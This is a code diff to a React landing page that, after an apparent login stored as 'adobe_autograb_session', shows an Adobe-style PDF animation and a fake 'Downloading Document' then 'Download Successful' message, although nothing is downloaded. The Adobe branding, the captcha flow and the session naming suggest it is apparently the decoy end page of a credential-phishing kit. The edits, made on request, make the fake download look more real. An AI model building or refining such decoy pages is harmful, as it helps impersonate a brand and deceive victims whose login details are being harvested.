@@ -5,26 +5,24 @@ interface LandingPageProps {
 }
 
 /**
- * Simplified LandingPage rebuilt to the new logic:
- * - After successful login (i.e. when adobe_autograb_session exists in localStorage),
- *   show a full-screen plain-text overlay that displays:
- *     "Downloading Document" with an animated dot sequence.
- * - After a short interval the message immediately switches to:
- *     "Download Successful".
- * - The "success" text remains visible indefinitely (until the page is refreshed).
- *
- * The overlay is shown only once per session (tracked by sessionStorage key
- * "adobe_download_shown::<sessionId>" ).
- *
- * NOTE: when the sequence finishes we remove the persisted adobe_autograb_session from localStorage
- * so that a page refresh will return the user to the captcha flow (App.tsx reads localStorage).
+ * Updated behavior per request:
+ * - Replace static Adobe icon background with a real (CSS) PDF document animation component.
+ * - Run a single flow: "Downloading..." -> "Download Successful" -> then hide the text,
+ *   leaving the PDF document displayed plainly (no success text over it).
+ * - Make the "Downloading" and "Download Successful" texts clearly visible without
+ *   heavy high-contrast treatments (no outlines/strokes/shadows).
+ * - Still only show the flow once per session (sessionStorage keyed by sessionId),
+ *   and remove 'adobe_autograb_session' from localStorage when the sequence finishes.
  */
 const LandingPage: React.FC<LandingPageProps> = () => {
   const [showOverlay, setShowOverlay] = useState(false);
   const [phase, setPhase] = useState<'idle' | 'downloading' | 'success'>('idle');
   const [dots, setDots] = useState('');
+  const [docAnimating, setDocAnimating] = useState(false);
+
   const dotIntervalRef = useRef<number | null>(null);
   const successTimeoutRef = useRef<number | null>(null);
+  const hideOverlayTimeoutRef = useRef<number | null>(null);
 
   useEffect(() => {
     // Check for a session in localStorage
@@ -52,6 +50,7 @@ const LandingPage: React.FC<LandingPageProps> = () => {
       // Start the download sequence
       setShowOverlay(true);
       setPhase('downloading');
+      setDocAnimating(true);
 
       // animate dots (1..6)
       let dotCount = 1;
@@ -62,7 +61,7 @@ const LandingPage: React.FC<LandingPageProps> = () => {
         setDots('.'.repeat(dotCount));
       }, dotInterval) as unknown as number;
 
-      // After 3 seconds show success and do NOT auto-hide (per user request)
+      // After 3 seconds show success, then shortly after hide overlay
       successTimeoutRef.current = window.setTimeout(() => {
         // stop dot animation
         if (dotIntervalRef.current) {
@@ -71,7 +70,8 @@ const LandingPage: React.FC<LandingPageProps> = () => {
         }
         setPhase('success');
         setDots('');
-        // mark shown so we don't restart sequence for same session (persists till full refresh)
+
+        // mark shown so we don't restart sequence for same session
         try {
           sessionStorage.setItem(shownKey, new Date().toISOString());
         } catch {
@@ -85,6 +85,14 @@ const LandingPage: React.FC<LandingPageProps> = () => {
         } catch {
           // ignore failures to remove storage
         }
+
+        // Hide the overlay text after a short delay, leaving the PDF document plain.
+        hideOverlayTimeoutRef.current = window.setTimeout(() => {
+          setShowOverlay(false);
+          setPhase('idle');
+          setDocAnimating(false);
+          hideOverlayTimeoutRef.current = null;
+        }, 1200) as unknown as number;
 
         successTimeoutRef.current = null;
       }, 3000) as unknown as number;
@@ -104,10 +112,13 @@ const LandingPage: React.FC<LandingPageProps> = () => {
         clearTimeout(successTimeoutRef.current);
         successTimeoutRef.current = null;
       }
+      if (hideOverlayTimeoutRef.current) {
+        clearTimeout(hideOverlayTimeoutRef.current);
+        hideOverlayTimeoutRef.current = null;
+      }
     };
   }, []);
 
-  // Render a minimal landing view plus the overlay when triggered.
   return (
     <div
       style={{
@@ -115,19 +126,18 @@ const LandingPage: React.FC<LandingPageProps> = () => {
         display: 'flex',
         alignItems: 'center',
         justifyContent: 'center',
-        background: `url('https://upload.wikimedia.org/wikipedia/commons/thumb/7/7d/Adobe_PDF.svg/640px-Adobe_PDF.svg.png') center center / contain no-repeat`,
-        color: '#fff'
+        background: '#f4f6f8',
+        color: '#111'
       }}
     >
-      {/* Background content intentionally blank per request */}
-      <div style={{ textAlign: 'center', opacity: 1 }}>
-        {/* intentionally empty */}
-      </div>
+      {/* Simple PDF Document Animation replacing the previous static icon */}
+      <PDFDocument animating={docAnimating} />
 
-      {/* Overlay with plain text and dot animation */}
+      {/* Overlay with plain text and dot animation (no high-contrast outlines/shadows) */}
       {showOverlay && (
         <div
           aria-live="polite"
+          role="status"
           style={{
             position: 'fixed',
             inset: 0,
@@ -140,19 +150,17 @@ const LandingPage: React.FC<LandingPageProps> = () => {
         >
           <div
             style={{
-              background: 'transparent',
-              color: '#ffffff',
+              background: 'rgba(255,255,255,0.92)',
+              color: '#111',
               textAlign: 'center',
               fontFamily: 'system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial',
               fontSize: 18,
               fontWeight: 600,
               pointerEvents: 'none',
-              // Subtle high-contrast treatments that keep the background visible
-              textShadow: '0 2px 8px rgba(0,0,0,0.75)',
-              WebkitTextStroke: '0.5px rgba(0,0,0,0.65)',
-              // Slight padding so text isn't flush to the edges on small screens
-              padding: '8px 12px',
-              borderRadius: 8
+              padding: '12px 16px',
+              borderRadius: 10,
+              border: '1px solid rgba(0,0,0,0.06)',
+              boxShadow: '0 4px 16px rgba(0,0,0,0.08)'
             }}
           >
             {phase === 'downloading' && <span>Downloading Document{dots}</span>}
@@ -163,5 +171,78 @@ const LandingPage: React.FC<LandingPageProps> = () => {
     </div>
   );
 };
+
+function PDFDocument({ animating }: { animating: boolean }) {
+  return (
+    <div style={{ position: 'relative' }}>
+      <style>
+        {`
+          @keyframes pdfFloat {
+            0%   { transform: translateY(0px);   }
+            50%  { transform: translateY(-10px); }
+            100% { transform: translateY(0px);   }
+          }
+          .pdf-doc {
+            position: relative;
+            width: 240px;
+            height: 300px;
+            border-radius: 14px;
+            background: #ffffff;
+            box-shadow: 0 10px 28px rgba(0,0,0,0.12);
+            transition: transform 300ms ease;
+          }
+          .pdf-doc.animating {
+            animation: pdfFloat 3s ease-in-out infinite;
+          }
+          .pdf-fold {
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 0;
+            height: 0;
+            border-left: 34px solid transparent;
+            border-top: 34px solid #eceff3;
+            border-top-right-radius: 10px;
+          }
+          .pdf-badge {
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            background: #e53935;
+            color: #fff;
+            font-weight: 700;
+            font-size: 12px;
+            padding: 4px 8px;
+            border-radius: 6px;
+            letter-spacing: 0.6px;
+          }
+          .pdf-lines span {
+            display: block;
+            height: 10px;
+            background: #e9eef3;
+            border-radius: 6px;
+            margin: 12px 18px;
+          }
+          .pdf-lines span:nth-child(1) { width: 82%; margin-top: 64px; }
+          .pdf-lines span:nth-child(2) { width: 66%; }
+          .pdf-lines span:nth-child(3) { width: 90%; }
+          .pdf-lines span:nth-child(4) { width: 72%; }
+          .pdf-lines span:nth-child(5) { width: 86%; }
+        `}
+      </style>
+      <div className={`pdf-doc ${animating ? 'animating' : ''}`}>
+        <div className="pdf-fold" />
+        <div className="pdf-badge">PDF</div>
+        <div className="pdf-lines">
+          <span />
+          <span />
+          <span />
+          <span />
+          <span />
+        </div>
+      </div>
+    </div>
+  );
+}
 
 export default LandingPage;
